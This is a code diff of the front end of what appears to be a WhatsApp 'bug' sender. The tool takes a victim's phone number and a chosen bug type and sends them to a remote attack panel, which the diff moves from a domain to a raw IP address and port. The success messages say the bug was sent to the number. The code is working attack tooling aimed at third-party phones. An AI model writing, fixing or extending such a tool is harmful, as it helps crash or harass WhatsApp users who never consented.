@@ -289,27 +289,37 @@ async function sendBug() {
   const resDiv = document.getElementById("result");
   const btn = document.getElementById("sendBtn");
 
-  if (!/^\d+(@s\.whatsapp\.net)?$/.test(input)) {
+  if (!/^\d{6,}$/.test(input)) {
     resDiv.innerText = "Masukkan nomor WA yang valid!";
     resDiv.style.color = "crimson";
     return;
   }
 
-  const chatId = input.includes("@s.whatsapp.net") ? input : `${input}@s.whatsapp.net`;
+  const chatId = `${input}@s.whatsapp.net`;
   btn.disabled = true;
   const originalHTML = btn.innerHTML;
   btn.innerHTML = '<span class="spinner"></span> Mengirim...';
   resDiv.innerText = "";
 
-try {
-  const res = await fetch(`https://panel-priv.astapremium.xyz/ekalnotdev?chatId=${encodeURIComponent(chatId)}&type=${selectedBug}`);
-  const json = await res.json();
+  try {
+    const url = `http://89.46.65.177:9206/ekalnotdev?chatId=${encodeURIComponent(chatId)}&type=${selectedBug}`;
+    const res = await fetch(url);
 
-  showPopup(`Tachi Bug successfully sent to <b>${input}</b>`);
-} catch (err) {
-  resDiv.innerText = "❌ Gagal fetch: " + err;
-  resDiv.style.color = "crimson";
-}
+    if (!res.ok) throw new Error("HTTP status " + res.status);
+
+    const json = await res.json();
+
+    if (json?.success) {
+      showPopup(`✅ Bug berhasil dikirim ke <b>${input}</b>`);
+    } else {
+      resDiv.innerText = "❌ Gagal mengirim bug!";
+      resDiv.style.color = "crimson";
+    }
+
+  } catch (err) {
+    resDiv.innerText = "❌ Gagal fetch: " + err.message;
+    resDiv.style.color = "crimson";
+  }
 
   btn.disabled = false;
   btn.innerHTML = originalHTML;
